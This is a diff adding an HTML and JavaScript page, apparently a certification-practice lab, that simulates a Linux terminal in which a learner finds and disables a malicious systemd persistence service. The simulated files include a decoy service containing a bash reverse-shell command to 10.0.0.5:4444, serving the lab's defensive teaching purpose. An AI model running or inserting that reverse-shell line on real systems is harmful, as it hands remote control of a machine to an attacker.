@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sim 1: Incident Response</title>
+    <link rel="stylesheet" href="../../../../assets/style.css">
+    <style>
+        .sim-top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .info-btn {
+            padding: 8px;
+            background-color: var(--interactive-blue);
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            color: white;
+            line-height: 0;
+        }
+
+        .info-btn:hover {
+            background-color: var(--interactive-blue-hover);
+        }
+
+        .info-btn svg {
+            width: 24px;
+            height: 24px;
+            fill: currentColor;
+        }
+        
+        .terminal-wrapper {
+            position: relative;
+        }
+
+        #terminal {
+            width: 100%;
+            height: 500px;
+            background-color: #1e1e1e;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 10px;
+            overflow-y: auto;
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #dcdcdc;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .terminal-line {
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .prompt-line {
+            display: flex;
+        }
+
+        .prompt {
+            color: #1eff8e; 
+            white-space: nowrap; 
+        }
+
+        .user-input {
+            background-color: transparent;
+            border: none;
+            color: #dcdcdc;
+            font-family: inherit;
+            font-size: inherit;
+            flex-grow: 1;
+            padding-left: 0.5em; 
+        }
+
+        .user-input:focus {
+            outline: none;
+        }
+
+        .executed-command {
+             padding-left: 0.5em; 
+        }
+
+        #login-modal {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.8);
+            border-radius: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .login-box {
+            background-color: var(--bg-dark-secondary);
+            padding: 2rem;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            width: 300px;
+            text-align: center;
+        }
+
+        .login-box h4 {
+            margin-top: 0;
+            margin-bottom: 1.5rem;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 1rem;
+            background: var(--bg-dark-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            color: white;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: var(--interactive-blue);
+            color: white;
+            cursor: pointer;
+        }
+
+        .login-box button:hover {
+            background-color: var(--interactive-blue-hover);
+        }
+
+        #login-error {
+            color: #ff4d4d;
+            margin-top: 1rem;
+            height: 1em;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="sim-container">
+        <div class="sim-top-bar">
+            <a href="../index.html" class="back-btn">Back to SecurityX Menu</a>
+            <button id="infoBtn" class="info-btn" title="Show Instructions">
+                <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+            </button>
+        </div>
+
+        <h3>Sim 1: Incident Response</h3>
+        <p>Using the terminal below, investigate the system for indicators of compromise and remediate them.</p>
+        
+        <div class="terminal-wrapper">
+            <div id="terminal" tabindex="0"></div>
+            <div id="login-modal">
+                <div class="login-box">
+                    <h4>System Login</h4>
+                    <input type="text" id="username" placeholder="Username">
+                    <input type="password" id="password" placeholder="Password">
+                    <button id="loginBtn">Login</button>
+                    <p id="login-error"></p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="sim-controls">
+             <div></div>
+             <div>
+                <button class="sim-reset-btn" id="resetBtn">Reset Sim</button>
+             </div>
+        </div>
+    </div>
+
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <pre id="modal-body-content" style="white-space: pre-wrap; font-family: sans-serif;"></pre>
+            <button class="modal-close-btn">Close</button>
+        </div>
+    </div>
+
+    <script>
+        const infoModal = document.getElementById("modal");
+        const modalBody = document.getElementById("modal-body-content");
+        function showInfoModal(message) {
+            modalBody.textContent = message;
+            infoModal.style.display = "flex";
+        }
+        function closeInfoModal() { infoModal.style.display = "none"; }
+        infoModal.querySelector('.modal-close-btn').onclick = closeInfoModal;
+        infoModal.onclick = e => { if (e.target.id === 'modal') closeInfoModal(); };
+
+        const sim75 = {
+            data: {
+                info: `This system was recently patched following the exploitation of a vulnerability by an attacker to enable data exfiltration.\n\nDespite the vulnerability being patched, it is likely that a malicious TCP service is still running and the adversary has achieved persistence by creating a systemd service.\n\nINSTRUCTIONS\nUsing the following credentials:\n• Username: labadmin\n• Password: Passw0rd!\n\nInvestigate to identify indicators of compromise and then remediate them. You will need to make changes to remove the malicious persistence agent by disabling the service's ability to start on boot and stopping the current process.\n\nExamples of commands to use:\nkill, killall, lsof, man, --help, netstat, ps, systemctl`
+            },
+            state: {},
+            setup: function() {
+                document.getElementById('login-modal').style.display = 'flex';
+                document.getElementById('login-error').textContent = '';
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('username').focus();
+
+                this.state = {
+                    progress: 0, 
+                    isComplete: false,
+                    processes: {
+                        '1': { user: 'root', pid: '1', cpu: '0.0', mem: '0.1', tty: '?', stat: 'Ss', command: 'systemd' },
+                        '123': { user: 'root', pid: '123', cpu: '0.1', mem: '0.2', tty: '?', stat: 'S', command: '[kthreadd]' },
+                        '456': { user: 'labadmin', pid: '456', cpu: '0.0', mem: '0.5', tty: 'pts/0', stat: 'Ss', command: 'bash' },
+                        '789': { user: 'root', pid: '789', cpu: '0.3', mem: '0.4', tty: '?', stat: 'Ssl', command: 'systemd-journald' },
+                        '1337': { user: 'root', pid: '1337', cpu: '5.5', mem: '1.2', tty: '?', stat: 'S', command: '[kworker/u8:1]' },
+                        '2468': { user: 'postfix', pid: '2468', cpu: '0.0', mem: '0.3', tty: '?', stat: 'S', command: 'postfix/qmgr' },
+                    },
+                    services: {
+                        'memcached-sys.service': { load: 'loaded', active: 'active', sub: 'running', desc: 'Memcached-like System Service', enabled: true, isMalicious: true },
+                        'revshell.service': { load: 'loaded', active: 'inactive', sub: 'dead', desc: 'Reverse Shell Service', enabled: false, isMalicious: false },
+                        'ssh.service': { load: 'loaded', active: 'active', sub: 'running', desc: 'OpenBSD Secure Shell server', enabled: true, isMalicious: false },
+                        'systemd-networkd.service': { load: 'loaded', active: 'active', sub: 'running', desc: 'Network Service', enabled: true, isMalicious: false },
+                        'ufw.service': { load: 'loaded', active: 'active', sub: 'exited', desc: 'Uncomplicated Firewall', enabled: true, isMalicious: false }
+                    },
+                    files: {
+                        '/etc/systemd/system/memcached-sys.service': '[Unit]\nDescription=Memcached-like System Service\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/kworker/u8:1 --listen=0.0.0.0 --port=41730\nRestart=always\nUser=root\n\n[Install]\nWantedBy=multi-user.target',
+                        '/etc/systemd/system/revshell.service': '[Unit]\nDescription=Reverse Shell Service\n\n[Service]\nExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"\n\n[Install]\nWantedBy=multi-user.target',
+                    },
+                    network: {
+                        'tcp': [
+                            { proto: 'tcp', state: 'LISTEN', local: '0.0.0.0:22', foreign: '0.0.0.0:*', pid: 'ssh.service' },
+                            { proto: 'tcp', state: 'LISTEN', local: '0.0.0.0:41730', foreign: '0.0.0.0:*', pid: '1337/[kworker/u8:1]' }
+                        ]
+                    }
+                };
+                
+                const terminal = document.getElementById('terminal');
+                terminal.innerHTML = ''; 
+            },
+            
+            login: function() {
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                const errorEl = document.getElementById('login-error');
+
+                if (username === 'labadmin' && password === 'Passw0rd!') {
+                    document.getElementById('login-modal').style.display = 'none';
+                    this.startTerminal();
+                } else {
+                    errorEl.textContent = 'Invalid credentials. Please try again.';
+                }
+            },
+            
+            startTerminal: function() {
+                const terminal = document.getElementById('terminal');
+                terminal.innerHTML = `
+                    <div class="terminal-line">Welcome to the lab environment.</div>
+                    <div class="terminal-line">Login successful. Sudo is pre-authenticated.</div>
+                    <div class="terminal-line">&nbsp;</div>
+                `;
+                this.addPrompt();
+            },
+
+            checkProgress: function(command, args) {
+                const maliciousService = 'memcached-sys.service';
+                if (this.state.isComplete) return;
+                if (this.state.progress === 0 && command === 'systemctl' && (args.includes('list-units') || args.includes('list-unit-files'))) { this.state.progress = 1; return; }
+                if (this.state.progress === 1 && ((command === 'systemctl' && args[0] === 'status' && args[1] === maliciousService) || (command === 'cat' && args[0] === `/etc/systemd/system/${maliciousService}`))) { this.state.progress = 2; return; }
+                if (this.state.progress === 2 && command === 'systemctl' && args[0] === 'disable' && args[1] === maliciousService) {
+                    this.state.services[maliciousService].enabled = false; this.state.progress = 3;
+                    return 'Removed /etc/systemd/system/multi-user.target.wants/memcached-sys.service.';
+                }
+                if (this.state.progress === 3 && command === 'systemctl' && args[0] === 'stop' && args[1] === maliciousService) {
+                    this.state.services[maliciousService].active = 'inactive'; this.state.services[maliciousService].sub = 'dead';
+                    delete this.state.processes['1337'];
+                    this.state.network.tcp = this.state.network.tcp.filter(conn => !conn.pid.includes('1337'));
+                    this.state.progress = 4; this.state.isComplete = true;
+                    return `
+System remediated successfully!
+  - Malicious service 'memcached-sys.service' has been stopped.
+  - Persistence has been removed.
+
+SIMULATION COMPLETE.`;
+                }
+                if (this.state.progress < 3 && command === 'systemctl' && args[0] === 'disable' && args[1] === maliciousService) { return 'Error: Cannot disable. Please investigate the service first.'; }
+                if (this.state.progress < 4 && command === 'systemctl' && args[0] === 'stop' && args[1] === maliciousService) { return 'Error: Cannot stop. Please disable the service persistence first.'; }
+                return null;
+            },
+
+            execute: function(input) {
+                const parts = input.trim().split(/\s+/);
+                let command = parts[0];
+                const args = parts.slice(1);
+
+                if (command === 'sudo') { command = args.shift(); }
+
+                let output = `Command not found: ${command}`;
+                let progressMessage = null;
+
+                if (!this.state.isComplete) { progressMessage = this.checkProgress(command, args); }
+
+                switch (command) {
+                    case 'ps':
+                        if (args.includes('aux')) {
+                            output = 'USER         PID %CPU %MEM TTY      STAT    COMMAND\n';
+                            Object.values(this.state.processes).forEach(p => {
+                                output += `${p.user.padEnd(8)} ${p.pid.padStart(7)} ${p.cpu.padStart(4)} ${p.mem.padStart(4)} ${p.tty.padEnd(8)} ${p.stat.padEnd(7)} ${p.command}\n`;
+                            });
+                        } else { output = 'Usage: ps aux'; }
+                        break;
+                    case 'netstat':
+                         if (args.includes('-tulpn') || args.includes('-antp')) {
+                            output = 'Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n';
+                            this.state.network.tcp.forEach(conn => {
+                                output += `${conn.proto}      0      0 ${conn.local.padEnd(23)} ${conn.foreign.padEnd(23)} ${conn.state.padEnd(11)} ${conn.pid}\n`;
+                            });
+                         } else { output = 'Usage: netstat [-tulpn|-antp]'; }
+                        break;
+                    case 'systemctl':
+                        const isListCmd = args[0] === 'list-units' || args[0] === 'list-unit-files';
+                        const isStatusCmd = args[0] === 'status' && args[1];
+                        const isActionCmd = (args[0] === 'disable' || args[0] === 'stop') && args[1];
+                        if (isListCmd) {
+                            output = isListCmd && args[0] === 'list-unit-files' ? 'UNIT FILE                STATE\n' : 'UNIT                     LOAD   ACTIVE SUB     DESCRIPTION\n';
+                            Object.entries(this.state.services).forEach(([sName, s]) => {
+                                const enabled = s.enabled ? 'enabled' : 'disabled';
+                                if (isListCmd && args[0] === 'list-units') { output += `${sName.padEnd(24)} ${s.load} ${s.active} ${s.sub.padEnd(7)} ${s.desc}\n`; } 
+                                else { output += `${sName.padEnd(24)} ${enabled}\n`; }
+                            });
+                        } else if (isStatusCmd) {
+                            const service = this.state.services[args[1]];
+                            if (service) {
+                                output = `● ${args[1]} - ${service.desc}\n   Loaded: ${service.load} (${service.enabled ? 'enabled' : 'disabled'}; vendor preset: enabled)\n   Active: ${service.active} (${service.sub})\n`;
+                                if (service.isMalicious && service.active === 'active') { output += ` Main PID: 1337 (kworker/u8:1)`; }
+                            } else { output = `Unit ${args[1]} could not be found.`; }
+                        } else if (isActionCmd) { output = progressMessage || `Action '${args[0]}' on '${args[1]}' requires other steps first.`; } 
+                        else { output = 'Invalid systemctl command. Try "list-units", "status <service>", etc.'; }
+                        break;
+                    case 'cat': output = this.state.files[args[0]] || `cat: ${args[0]}: No such file or directory`; break;
+                    case 'kill': case 'pkill':
+                        if(args[0] === '1337' || args[0] === '[kworker/u8:1]'){ output = `Permission denied. Try stopping the service that manages this process.`; } 
+                        else { output = `kill: kill ${args[0]} failed: no such process`; }
+                        break;
+                    case 'ls': output = 'memcached-sys.service  revshell.service  ssh.service  systemd-networkd.service  ufw.service'; break;
+                    case 'clear': document.getElementById('terminal').innerHTML = ''; this.addPrompt(); return;
+                    case '': output = ''; break;
+                }
+                if (progressMessage && (command === 'systemctl' && (args[0] === 'disable' || args[0] === 'stop'))) { output = progressMessage; }
+                this.addOutput(input, output);
+            },
+            
+            addOutput: function(input, output) {
+                const terminal = document.getElementById('terminal');
+                const activePrompt = document.getElementById('userInput');
+                if (activePrompt && activePrompt.parentElement) {
+                    activePrompt.parentElement.remove();
+                }
+
+                const escapedInput = input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                terminal.innerHTML += `<div class="terminal-line"><span class="prompt">labadmin@sim-host:~$</span><span class="executed-command">${escapedInput}</span></div>`;
+                if (output) { terminal.innerHTML += `<div class="terminal-line">${output}</div>`; }
+                
+                this.addPrompt();
+            },
+
+            addPrompt: function() {
+                const terminal = document.getElementById('terminal');
+                if (this.state.isComplete) { terminal.scrollTop = terminal.scrollHeight; return; }
+                
+                terminal.innerHTML += `<div class="prompt-line"><span class="prompt">labadmin@sim-host:~$</span><input type="text" id="userInput" class="user-input" autocomplete="off"></div>`;
+                
+                const userInput = document.getElementById('userInput');
+                if (userInput) { userInput.focus(); }
+                
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+        };
+
+        document.addEventListener('DOMContentLoaded', () => {
+            sim75.setup();
+            
+            document.getElementById('resetBtn').addEventListener('click', () => sim75.setup());
+            document.getElementById('infoBtn').onclick = () => { showInfoModal(sim75.data.info); };
+            document.getElementById('loginBtn').addEventListener('click', () => sim75.login());
+            document.getElementById('password').addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') { sim75.login(); }
+            });
+
+            const terminal = document.getElementById('terminal');
+            terminal.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter' && e.target.matches('#userInput')) {
+                    e.preventDefault();
+                    sim75.execute(e.target.value);
+                }
+            });
+
+            terminal.addEventListener('click', (e) => {
+                const userInput = document.getElementById('userInput');
+                if (userInput) { userInput.focus(); }
+            });
+        });
+    </script>
+<script src="../../../../disable_dev_tools.js"></script>
+</body>
+</html>
